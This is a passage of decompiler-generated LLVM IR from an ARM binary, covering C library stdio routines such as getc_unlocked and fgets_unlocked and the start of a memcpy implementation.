  store i16 %v2_1020c, i16* %v2_10200, align 2
  %v1_10210 = load i32, i32* %r2.global-to-local, align 4
  %v2_10210 = load i32, i32* @r4, align 4
  %v3_10210 = add i32 %v2_10210, 28
  %v4_10210 = inttoptr i32 %v3_10210 to i32*
  store i32 %v1_10210, i32* %v4_10210, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  br label %bb73

bb73:                                             ; preds = %bb72, %.thread16, %dec_label_pc_101e0, %.thread14
  %v0_1021c = phi i32 [ -1, %.thread16 ], [ 0, %bb72 ], [ %v0_1021c.pre, %dec_label_pc_101e0 ], [ 0, %.thread14 ]
  store i32 %v0_1021c, i32* %r0.global-to-local, align 4
  store i32 %v6_fe98, i32* %r5.global-to-local, align 4
  ret i32 %v0_1021c

; uselistorder directives
  uselistorder i32 %v0_1021c, { 1, 0 }
  uselistorder i32 %v3_101d4, { 1, 2, 0 }
  uselistorder i32 %v0_101a8, { 1, 0, 2 }
  uselistorder i32 %v1_1018c.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_100f4, { 1, 0, 2 }
  uselistorder i32 %v1_100d8.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_100bc, { 1, 0 }
  uselistorder i32 %v0_10060, { 1, 0, 2 }
  uselistorder i32 %v1_10044.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_10034, { 1, 0 }
  uselistorder i32 %v0_fff8, { 1, 0, 2 }
  uselistorder i32 %v1_ffdc.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_ffc4, { 1, 0 }
  uselistorder i32 %v0_ff8c, { 1, 0, 2 }
  uselistorder i32 %v1_ff70.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_ff60, { 1, 0 }
  uselistorder i32 %v0_ff1c, { 1, 0, 2 }
  uselistorder i32 %v1_ff00.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v4_fed8, { 2, 1, 0, 3 }
  uselistorder i32 %tmp, { 0, 1, 3, 2, 4 }
  uselistorder i32* %sl.global-to-local, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 8, 7, 9 }
  uselistorder i32* %r3.global-to-local, { 4, 5, 6, 7, 8, 10, 9, 55, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 21, 0, 23, 24, 25, 26, 27, 28, 30, 29, 54, 31, 32, 33, 34, 36, 35, 2, 37, 38, 39, 40, 42, 41, 3, 43, 44, 45, 46, 48, 47, 1, 49, 50, 53, 51, 52 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13, 14, 15, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 4, 2, 3, 20, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21 }
  uselistorder i1* %cpsr_c.global-to-local, { 5, 17, 6, 7, 9, 8, 1, 10, 11, 12, 13, 14, 39, 40, 15, 16, 2, 18, 19, 21, 20, 3, 22, 23, 25, 24, 4, 26, 27, 28, 29, 37, 38, 30, 31, 33, 32, 0, 34, 35, 36 }
  uselistorder i32 168, { 0, 1, 2, 3, 6, 4, 7, 5, 8, 9, 10, 11, 14, 12, 15, 13, 16, 17, 21, 18, 22, 19, 23, 20, 24 }
  uselistorder label %bb73, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_101d4, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_101ac, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10194, { 1, 0 }
  uselistorder label %bb71, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10114, { 1, 0 }
  uselistorder label %dec_label_pc_10108, { 1, 0 }
  uselistorder label %bb70, { 1, 0 }
  uselistorder label %dec_label_pc_100f8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100e0, { 1, 0 }
  uselistorder label %dec_label_pc_1009c, { 1, 0 }
  uselistorder label %dec_label_pc_1008cthread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_10064, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1004c, { 1, 0 }
  uselistorder label %dec_label_pc_1000c, { 1, 0 }
  uselistorder label %bb68, { 1, 0 }
  uselistorder label %dec_label_pc_fffc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_ffe4, { 1, 0 }
  uselistorder label %dec_label_pc_ffb8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_ff90, { 2, 1, 0 }
  uselistorder label %dec_label_pc_ff78, { 1, 0 }
  uselistorder label %dec_label_pc_ff30, { 1, 0 }
  uselistorder label %bb66, { 1, 0 }
  uselistorder label %dec_label_pc_ff20, { 2, 1, 0 }
  uselistorder label %dec_label_pc_ff08, { 1, 0 }
  uselistorder label %dec_label_pc_fed4, { 1, 0 }
}

define i32 @function_10230(i32 %arg1) local_unnamed_addr {
dec_label_pc_10230:
  %v0_10230 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_10230, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_10230
  %v2_10230 = load i32, i32* @r4, align 4
  %v8_10230 = ashr i32 %v2_10230, %arg1
  %v9_10230 = and i32 %v8_10230, %arg1
  %v2_10234 = load i32, i32* @r8, align 4
  %v5_10234 = udiv i32 %v2_10234, 2
  %v6_10234 = and i32 %v9_10230, %v5_10234
  %v2_10238 = load i32, i32* @ip, align 4
  %v3_10238 = and i32 %v6_10234, %v2_10238
  %v5_1023c = udiv i32 %v3_10238, 2
  %v6_1023c = and i32 %v3_10238, %v2_10230
  %v4_10240 = and i32 %v6_1023c, %v5_1023c
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_10230, %bb
  %v5_10240 = phi i32 [ %arg1, %dec_label_pc_10230 ], [ %v4_10240, %bb ]
  ret i32 %v5_10240

; uselistorder directives
  uselistorder i32 %v3_10238, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @getc_unlocked(i16* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-17 = alloca i8, align 1
  %stack_var_-12 = alloca i32, align 4
  %v3_10244 = load i32, i32* @r4, align 4
  store i32 %v3_10244, i32* %stack_var_-12, align 4
  %v6_10244 = load i32, i32* @r5, align 4
  %v9_10244 = load i32, i32* @lr, align 4
  %v0_10248 = load i32, i32* @r0, align 4
  %v1_10248 = add i32 %v0_10248, 16
  %v2_10248 = inttoptr i32 %v1_10248 to i32*
  %v3_10248 = load i32, i32* %v2_10248, align 4
  store i32 %v3_10248, i32* %r2.global-to-local, align 4
  %v1_1024c = add i32 %v0_10248, 24
  %v2_1024c = inttoptr i32 %v1_1024c to i32*
  %v3_1024c = load i32, i32* %v2_1024c, align 4
  %v3_10250 = icmp ult i32 %v3_10248, %v3_1024c
  store i32 %v0_10248, i32* @r4, align 4
  br i1 %v3_10250, label %bb, label %dec_label_pc_10270

bb:                                               ; preds = %entry
  %v2_1025c = inttoptr i32 %v3_10248 to i8*
  %v3_1025c = load i8, i8* %v2_1025c, align 1
  %v4_1025c = zext i8 %v3_1025c to i32
  store i32 %v4_1025c, i32* %r0.global-to-local, align 4
  %v6_1025c = add i32 %v3_10248, 1
  store i32 %v6_1025c, i32* %r2.global-to-local, align 4
  store i32 %v6_1025c, i32* %v2_10248, align 4
  br label %dec_label_pc_1035c

dec_label_pc_10270:                               ; preds = %entry
  store i32 ptrtoint (i32* @global_var_22290.79 to i32), i32* @r5, align 4
  %v1_10270 = inttoptr i32 %v0_10248 to i16*
  %v2_10270 = load i16, i16* %v1_10270, align 2
  %v3_10270 = zext i16 %v2_10270 to i32
  %v1_10274 = and i32 %v3_10270, 131
  %tmp25 = icmp ugt i32 %v1_10274, 128
  br i1 %tmp25, label %dec_label_pc_10290, label %dec_label_pc_10280

dec_label_pc_10280:                               ; preds = %dec_label_pc_10270
  store i32 128, i32* @r1, align 4
  %v0_10284 = call i32 @__stdio_trans2r_o()
  store i32 %v0_10284, i32* %r0.global-to-local, align 4
  %v2_10288 = icmp eq i32 %v0_10284, 0
  br i1 %v2_10288, label %dec_label_pc_10280.dec_label_pc_10290_crit_edge, label %dec_label_pc_10358

dec_label_pc_10280.dec_label_pc_10290_crit_edge:  ; preds = %dec_label_pc_10280
  %v0_10290.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_10290

dec_label_pc_10290:                               ; preds = %dec_label_pc_10280.dec_label_pc_10290_crit_edge, %dec_label_pc_10270
  %v2_102d0 = phi i32 [ %v0_10290.pre, %dec_label_pc_10280.dec_label_pc_10290_crit_edge ], [ %v0_10248, %dec_label_pc_10270 ]
  %v1_10290 = inttoptr i32 %v2_102d0 to i16*
  %v2_10290 = load i16, i16* %v1_10290, align 2
  %v3_10290 = zext i16 %v2_10290 to i32
  store i32 %v3_10290, i32* %r2.global-to-local, align 4
  %v1_10294 = and i32 %v3_10290, 2
  %v2_10294 = icmp eq i32 %v1_10294, 0
  br i1 %v2_10294, label %dec_label_pc_102c0, label %dec_label_pc_1029c

dec_label_pc_1029c:                               ; preds = %dec_label_pc_10290
  %tmp26 = urem i16 %v2_10290, 2
  %v1_1029c = zext i16 %tmp26 to i32
  %tmp22 = sub nsw i32 0, %v1_1029c
  %v4_102a0 = and i32 %tmp22, 4
  %v5_102a0 = add i32 %v4_102a0, %v2_102d0
  %v1_102a4 = add i32 %v5_102a0, 36
  %v2_102a4 = inttoptr i32 %v1_102a4 to i8*
  %v3_102a4 = load i8, i8* %v2_102a4, align 1
  %v4_102a4 = zext i8 %v3_102a4 to i32
  %v1_102a8 = add nsw i32 %v3_10290, -1
  store i32 %v1_102a8, i32* %r2.global-to-local, align 4
  store i32 %v4_102a4, i32* %r0.global-to-local, align 4
  %v2_102b4 = add i32 %v2_102d0, 40
  %v3_102b4 = inttoptr i32 %v2_102b4 to i32*
  store i32 0, i32* %v3_102b4, align 4
  %v0_102b8 = load i32, i32* %r2.global-to-local, align 4
  %v1_102b8 = trunc i32 %v0_102b8 to i16
  %v2_102b8 = load i32, i32* @r4, align 4
  %v3_102b8 = inttoptr i32 %v2_102b8 to i16*
  store i16 %v1_102b8, i16* %v3_102b8, align 2
  br label %dec_label_pc_1035c

dec_label_pc_102c0:                               ; preds = %dec_label_pc_10290
  %v1_102c0 = add i32 %v2_102d0, 16
  %v1_102c4 = inttoptr i32 %v1_102c0 to i32*
  %v2_102c4 = load i32, i32* %v1_102c4, align 4
  store i32 %v2_102c4, i32* @r1, align 4
  %v3_102c4 = add i32 %v2_102d0, 20
  %v4_102c4 = inttoptr i32 %v3_102c4 to i32*
  %v5_102c4 = load i32, i32* %v4_102c4, align 4
  %v9_102c8 = icmp eq i32 %v5_102c4, %v2_102c4
  br i1 %v9_102c8, label %dec_label_pc_102d8, label %.thread4

.thread4:                                         ; preds = %dec_label_pc_102c0
  %v2_102cc = inttoptr i32 %v2_102c4 to i8*
  %v3_102cc = load i8, i8* %v2_102cc, align 1
  %v4_102cc = zext i8 %v3_102cc to i32
  store i32 %v4_102cc, i32* %r0.global-to-local, align 4
  %v6_102cc = add i32 %v2_102c4, 1
  store i32 %v6_102cc, i32* @r1, align 4
  store i32 %v6_102cc, i32* %v1_102c4, align 4
  br label %dec_label_pc_1035c

dec_label_pc_102d8:                               ; preds = %dec_label_pc_102c0
  %v1_102d8 = add i32 %v2_102d0, 4
  %v2_102d8 = inttoptr i32 %v1_102d8 to i32*
  %v3_102d8 = load i32, i32* %v2_102d8, align 4
  %v7_102dc = icmp eq i32 %v3_102d8, -2
  br i1 %v7_102dc, label %.thread7, label %dec_label_pc_102f0

.thread7:                                         ; preds = %dec_label_pc_102d8
  %v2_102e0 = or i16 %v2_10290, 4
  store i32 -1, i32* %r0.global-to-local, align 4
  store i16 %v2_102e0, i16* %v1_10290, align 2
  br label %dec_label_pc_1035c

dec_label_pc_102f0:                               ; preds = %dec_label_pc_102d8
  %v1_102f0 = and i32 %v3_10290, 768
  %v2_102f0 = icmp eq i32 %v1_102f0, 0
  br i1 %v2_102f0, label %.thread9, label %bb23

bb23:                                             ; preds = %dec_label_pc_102f0
  %v1_102f8 = load i32, i32* @r5, align 4
  %v3_102f8 = add i32 %v1_102f8, 84
  %v4_102f8 = inttoptr i32 %v3_102f8 to i32*
  %v5_102f8 = load i32, i32* %v4_102f8, align 4
  store i32 %v5_102f8, i32* %r0.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_102f0, %bb23
  store i32 66304, i32* @lr, align 4
  %v1_102fc = xor i1 %v2_102f0, true
  call void @__pseudo_cond_branch(i1 %v1_102fc, i32 ptrtoint (i32* @global_var_fe98.336 to i32))
  %v0_10300 = load i32, i32* @r4, align 4
  %v1_10300 = add i32 %v0_10300, 8
  store i32 %v1_10300, i32* %r2.global-to-local, align 4
  %v1_10304 = inttoptr i32 %v1_10300 to i32*
  %v2_10304 = load i32, i32* %v1_10304, align 4
  store i32 %v2_10304, i32* %r2.global-to-local, align 4
  %v3_10304 = add i32 %v0_10300, 12
  %v4_10304 = inttoptr i32 %v3_10304 to i32*
  %v5_10304 = load i32, i32* %v4_10304, align 4
  %v9_10308 = icmp eq i32 %v5_10304, %v2_10304
  br i1 %v9_10308, label %dec_label_pc_1033c, label %dec_label_pc_10310

dec_label_pc_10310:                               ; preds = %.thread9
  %v2_10310 = add i32 %v0_10300, 24
  %v3_10310 = inttoptr i32 %v2_10310 to i32*
  store i32 %v2_10304, i32* %v3_10310, align 4
  %v0_10314 = load i32, i32* @r4, align 4
  store i32 %v0_10314, i32* %r0.global-to-local, align 4
  %v2_10318 = call i32 @__stdio_rfill(i32 %v0_10314)
  store i32 %v2_10318, i32* %r0.global-to-local, align 4
  %v2_1031c = icmp eq i32 %v2_10318, 0
  br i1 %v2_1031c, label %dec_label_pc_10358, label %dec_label_pc_10324

dec_label_pc_10324:                               ; preds = %dec_label_pc_10310
  %v0_10324 = load i32, i32* @r4, align 4
  %v1_10324 = add i32 %v0_10324, 20
  %v2_10324 = inttoptr i32 %v1_10324 to i32*
  %v3_10324 = load i32, i32* %v2_10324, align 4
  %v2_10328 = add i32 %v0_10324, 24
  %v3_10328 = inttoptr i32 %v2_10328 to i32*
  store i32 %v3_10324, i32* %v3_10328, align 4
  %v0_1032c = load i32, i32* @r4, align 4
  %v1_1032c = add i32 %v0_1032c, 16
  %v2_1032c = inttoptr i32 %v1_1032c to i32*
  %v3_1032c = load i32, i32* %v2_1032c, align 4
  %v1_10330 = inttoptr i32 %v3_1032c to i8*
  %v2_10330 = load i8, i8* %v1_10330, align 1
  %v3_10330 = zext i8 %v2_10330 to i32
  store i32 %v3_10330, i32* %r0.global-to-local, align 4
  %v5_10330 = add i32 %v3_1032c, 1
  store i32 %v5_10330, i32* %v2_1032c, align 4
  br label %dec_label_pc_1035c

dec_label_pc_1033c:                               ; preds = %.thread9
  %v1_1033c = inttoptr i32 %v0_10300 to i16*
  store i32 %v0_10300, i32* %r0.global-to-local, align 4
  %v2_10340 = ptrtoint i8* %stack_var_-17 to i32
  store i32 %v2_10340, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_10348 = call i32 @__stdio_READ(i16* %v1_1033c, i32 %v2_10340, i32 1)
  store i32 %v5_10348, i32* %r0.global-to-local, align 4
  %v2_1034c = icmp eq i32 %v5_10348, 0
  br i1 %v2_1034c, label %dec_label_pc_10358, label %bb24

bb24:                                             ; preds = %dec_label_pc_1033c
  %v4_10350 = load i8, i8* %stack_var_-17, align 1
  %v5_10350 = sext i8 %v4_10350 to i32
  store i32 %v5_10350, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1035c

dec_label_pc_10358:                               ; preds = %dec_label_pc_1033c, %dec_label_pc_10280, %dec_label_pc_10310
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1035c

dec_label_pc_1035c:                               ; preds = %bb, %.thread7, %bb24, %.thread4, %dec_label_pc_10324, %dec_label_pc_1029c, %dec_label_pc_10358
  %v2_10360 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_10360, i32* @r4, align 4
  store i32 %v6_10244, i32* @r5, align 4
  store i32 %v9_10244, i32* @lr, align 4
  %v1_10364 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_10364

; uselistorder directives
  uselistorder i32 %v2_102c4, { 1, 0, 2, 3 }
  uselistorder i32 %v2_102d0, { 1, 3, 2, 4, 0, 5 }
  uselistorder i32 %v3_10248, { 1, 0, 2, 3 }
  uselistorder i8* %stack_var_-17, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 11, 0, 1, 4, 2, 3, 6, 5, 7, 8, 9, 10, 13, 12 }
  uselistorder label %dec_label_pc_1035c, { 6, 2, 4, 1, 3, 5, 0 }
  uselistorder label %dec_label_pc_10358, { 0, 2, 1 }
  uselistorder label %.thread9, { 1, 0 }
}

define i32 @__GI_fgets_unlocked(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v9_10370 = load i32, i32* @r6, align 4
  %v12_10370 = load i32, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10374 = icmp eq i32 %arg2, 0
  store i1 %v2_10374, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg3, i32* @r4, align 4
  %tmp22 = icmp slt i32 %arg2, 1
  br i1 %tmp22, label %dec_label_pc_103fc, label %dec_label_pc_103e4.preheader

dec_label_pc_103e4.preheader:                     ; preds = %entry
  store i32 %tmp, i32* @r5, align 4
  %v1_103e42 = add i32 %arg2, -1
  store i32 %v1_103e42, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v7_103e48 = icmp eq i32 %arg2, 1
  store i1 %v7_103e48, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_103e48, label %dec_label_pc_103ec, label %dec_label_pc_10390

dec_label_pc_10390:                               ; preds = %dec_label_pc_103e4.preheader, %dec_label_pc_103e4.backedge.dec_label_pc_10390_crit_edge
  %v0_103b4 = phi i32 [ %v0_10390.pre, %dec_label_pc_103e4.backedge.dec_label_pc_10390_crit_edge ], [ %arg3, %dec_label_pc_103e4.preheader ]
  %v1_10390 = add i32 %v0_103b4, 16
  %v2_10390 = inttoptr i32 %v1_10390 to i32*
  %v3_10390 = load i32, i32* %v2_10390, align 4
  store i32 %v3_10390, i32* %r2.global-to-local, align 4
  %v1_10394 = add i32 %v0_103b4, 24
  %v2_10394 = inttoptr i32 %v1_10394 to i32*
  %v3_10394 = load i32, i32* %v2_10394, align 4
  store i32 %v3_10394, i32* %r3.global-to-local, align 4
  %v3_10398 = icmp uge i32 %v3_10390, %v3_10394
  store i1 %v3_10398, i1* %cpsr_c.global-to-local, align 1
  %v9_10398 = icmp eq i32 %v3_10390, %v3_10394
  store i1 %v9_10398, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_10398, label %dec_label_pc_103b4, label %dec_label_pc_103a0

dec_label_pc_103a0:                               ; preds = %dec_label_pc_10390
  %v1_103a0 = inttoptr i32 %v3_10390 to i8*
  %v2_103a0 = load i8, i8* %v1_103a0, align 1
  %v3_103a0 = zext i8 %v2_103a0 to i32
  store i32 %v3_103a0, i32* %r3.global-to-local, align 4
  %v5_103a0 = add i32 %v3_10390, 1
  store i32 %v5_103a0, i32* %r2.global-to-local, align 4
  %v2_103a4 = load i32, i32* @r5, align 4
  %v3_103a4 = inttoptr i32 %v2_103a4 to i8*
  store i8 %v2_103a0, i8* %v3_103a4, align 1
  %v4_103a4 = load i32, i32* @r5, align 4
  %v5_103a4 = add i32 %v4_103a4, 1
  store i32 %v5_103a4, i32* @r5, align 4
  %v0_103a8 = load i32, i32* %r3.global-to-local, align 4
  %v2_103a8 = icmp ugt i32 %v0_103a8, 9
  store i1 %v2_103a8, i1* %cpsr_c.global-to-local, align 1
  %v7_103a8 = icmp eq i32 %v0_103a8, 10
  store i1 %v7_103a8, i1* %cpsr_z.global-to-local, align 1
  %v0_103ac = load i32, i32* %r2.global-to-local, align 4
  %v1_103ac = load i32, i32* @r4, align 4
  %v2_103ac = add i32 %v1_103ac, 16
  %v3_103ac = inttoptr i32 %v2_103ac to i32*
  store i32 %v0_103ac, i32* %v3_103ac, align 4
  br i1 %v7_103a8, label %dec_label_pc_103ec, label %dec_label_pc_103e4.backedge

dec_label_pc_103b4:                               ; preds = %dec_label_pc_10390
  %v1_103b4 = inttoptr i32 %v0_103b4 to i16*
  %v3_103b8 = call i32 @getc_unlocked(i16* %v1_103b4)
  %v3_103bc = icmp eq i32 %v3_103b8, -1
  store i1 %v3_103bc, i1* %cpsr_c.global-to-local, align 1
  %v8_103bc = icmp eq i32 %v3_103b8, -1
  store i1 %v8_103bc, i1* %cpsr_z.global-to-local, align 1
  %v1_103c0 = urem i32 %v3_103b8, 256
  store i32 %v1_103c0, i32* %r3.global-to-local, align 4
  br i1 %v3_103bc, label %dec_label_pc_103c8, label %dec_label_pc_103e0

dec_label_pc_103c8:                               ; preds = %dec_label_pc_103b4
  %v0_103c8 = load i32, i32* @r4, align 4
  %v1_103c8 = inttoptr i32 %v0_103c8 to i16*
  %v2_103c8 = load i16, i16* %v1_103c8, align 2
  %v3_103c8 = zext i16 %v2_103c8 to i32
  store i32 %v3_103c8, i32* %r3.global-to-local, align 4
  %v1_103cc = and i32 %v3_103c8, 8
  %v2_103cc = icmp eq i32 %v1_103cc, 0
  store i1 %v2_103cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_103cc, label %dec_label_pc_103ec, label %dec_label_pc_103fc

dec_label_pc_103e0:                               ; preds = %dec_label_pc_103b4
  %v1_103d8 = trunc i32 %v3_103b8 to i8
  %v2_103d8 = load i32, i32* @r5, align 4
  %v3_103d8 = inttoptr i32 %v2_103d8 to i8*
  store i8 %v1_103d8, i8* %v3_103d8, align 1
  %v4_103d8 = load i32, i32* @r5, align 4
  %v5_103d8 = add i32 %v4_103d8, 1
  store i32 %v5_103d8, i32* @r5, align 4
  %v0_103dc = load i32, i32* %r3.global-to-local, align 4
  %v2_103dc = icmp ugt i32 %v0_103dc, 9
  store i1 %v2_103dc, i1* %cpsr_c.global-to-local, align 1
  %v7_103dc = icmp eq i32 %v0_103dc, 10
  store i1 %v7_103dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_103dc, label %dec_label_pc_103ec, label %dec_label_pc_103e4.backedge

dec_label_pc_103e4.backedge:                      ; preds = %dec_label_pc_103e0, %dec_label_pc_103a0
  %v0_103e4 = load i32, i32* @r6, align 4
  %v1_103e4 = add i32 %v0_103e4, -1
  store i32 %v1_103e4, i32* @r6, align 4
  %v2_103e4 = icmp ne i32 %v0_103e4, 0
  store i1 %v2_103e4, i1* %cpsr_c.global-to-local, align 1
  %v7_103e4 = icmp eq i32 %v0_103e4, 1
  store i1 %v7_103e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_103e4, label %dec_label_pc_103ec, label %dec_label_pc_103e4.backedge.dec_label_pc_10390_crit_edge

dec_label_pc_103e4.backedge.dec_label_pc_10390_crit_edge: ; preds = %dec_label_pc_103e4.backedge
  %v0_10390.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_10390

dec_label_pc_103ec:                               ; preds = %dec_label_pc_103e0, %dec_label_pc_103e4.backedge, %dec_label_pc_103a0, %dec_label_pc_103e4.preheader, %dec_label_pc_103c8
  %v0_103ec = load i32, i32* @r5, align 4
  %v1_103ec = load i32, i32* @r7, align 4
  %v3_103ec = icmp uge i32 %v0_103ec, %v1_103ec
  store i1 %v3_103ec, i1* %cpsr_c.global-to-local, align 1
  %v9_103ec = icmp eq i32 %v0_103ec, %v1_103ec
  store i1 %v9_103ec, i1* %cpsr_z.global-to-local, align 1
  %v2_103f0 = xor i1 %v9_103ec, true
  %v3_103f0 = and i1 %v3_103ec, %v2_103f0
  br i1 %v3_103f0, label %bb, label %.thread14

bb:                                               ; preds = %dec_label_pc_103ec
  store i32 0, i32* %r3.global-to-local, align 4
  %v7_103f4 = inttoptr i32 %v0_103ec to i8*
  store i8 0, i8* %v7_103f4, align 1
  %v0_103f8.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_103f8.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br label %.thread14

.thread14:                                        ; preds = %dec_label_pc_103ec, %bb
  %v1_103f8 = phi i1 [ %v1_103f8.pre, %bb ], [ %v9_103ec, %dec_label_pc_103ec ]
  %v0_103f8 = phi i1 [ %v0_103f8.pre, %bb ], [ %v3_103ec, %dec_label_pc_103ec ]
  %v2_103f8 = xor i1 %v1_103f8, true
  %v3_103f8 = and i1 %v0_103f8, %v2_103f8
  br i1 %v3_103f8, label %.dec_label_pc_10400_crit_edge, label %dec_label_pc_103fc

.dec_label_pc_10400_crit_edge:                    ; preds = %.thread14
  %v0_10400.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_10400

dec_label_pc_103fc:                               ; preds = %entry, %dec_label_pc_103c8, %.thread14
  br label %dec_label_pc_10400

dec_label_pc_10400:                               ; preds = %.dec_label_pc_10400_crit_edge, %dec_label_pc_103fc
  %v0_10400 = phi i32 [ %v0_10400.pre, %.dec_label_pc_10400_crit_edge ], [ 0, %dec_label_pc_103fc ]
  store i32 %v9_10370, i32* @r6, align 4
  store i32 %v12_10370, i32* @r7, align 4
  ret i32 %v0_10400

; uselistorder directives
  uselistorder i1 %v9_103ec, { 1, 0, 2 }
  uselistorder i32 %v1_103ec, { 1, 0 }
  uselistorder i32 %v0_103ec, { 0, 2, 1 }
  uselistorder i32 %v0_103e4, { 2, 0, 1 }
  uselistorder i32 %v0_103dc, { 1, 0 }
  uselistorder i32 %v3_103b8, { 2, 1, 0, 3 }
  uselistorder i32 %v0_103a8, { 1, 0 }
  uselistorder i32 %v3_10390, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_103b4, { 0, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 8, 3, 4, 5, 6, 7, 0, 9 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 2, 7, 3, 4, 5, 6, 0, 8 }
  uselistorder i32 (i16*)* @getc_unlocked, { 3, 0, 1, 2 }
  uselistorder i32 %arg2, { 2, 1, 0, 3, 4 }
  uselistorder label %dec_label_pc_10400, { 1, 0 }
  uselistorder label %dec_label_pc_103fc, { 2, 1, 0 }
  uselistorder label %.thread14, { 1, 0 }
  uselistorder label %dec_label_pc_103ec, { 1, 0, 4, 2, 3 }
  uselistorder label %dec_label_pc_10390, { 1, 0 }
}

define i32 @_memcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i8*, align 4
  %v0_10410 = load i32, i32* @r1, align 4
  %v1_10410 = load i32, i32* %r0.global-to-local, align 4
  %v2_10410 = sub i32 %v0_10410, %v1_10410
  %v3_10410 = icmp ult i32 %v0_10410, %v1_10410
  %v4_10410 = xor i32 %v1_10410, %v0_10410
  %v5_10410 = xor i32 %v2_10410, %v0_10410
  %v6_10410 = and i32 %v5_10410, %v4_10410
  %v7_10410 = icmp slt i32 %v6_10410, 0
  store i1 %v7_10410, i1* %cpsr_v.global-to-local, align 1
  %v8_10410 = icmp slt i32 %v2_10410, 0
  store i1 %v8_10410, i1* %cpsr_n.global-to-local, align 1
  %v9_10410 = icmp eq i32 %v0_10410, %v1_10410
  store i1 %v9_10410, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_10410, label %dec_label_pc_10664, label %dec_label_pc_10418

dec_label_pc_10418:                               ; preds = %entry
  br i1 %v9_10410, label %.thread130, label %bb

.thread130:                                       ; preds = %bb154, %.thread129, %bb151, %dec_label_pc_10418
  %merge = phi i32 [ %v0_10410, %dec_label_pc_10418 ], [ %v2_106f8, %bb151 ], [ %v11_10714, %bb154 ], [ %v7_10714, %.thread129 ]
  ret i32 %merge

bb:                                               ; preds = %dec_label_pc_10418
  %v5_1041c = inttoptr i32 %v1_10410 to i8*
  store i8* %v5_1041c, i8** %stack_var_-8, align 4
  %v8_1041c = load i32, i32* @lr, align 4
  %v0_10420 = load i32, i32* @r2, align 4
  %v2_10420 = add i32 %v0_10420, -4
  store i32 %v2_10420, i32* %r2.global-to-local, align 4
  %v4_10420 = sub i32 3, %v0_10420
  %v5_10420 = and i32 %v4_10420, %v0_10420
  %v6_10420 = icmp slt i32 %v5_10420, 0
  store i1 %v6_10420, i1* %cpsr_v.global-to-local, align 1
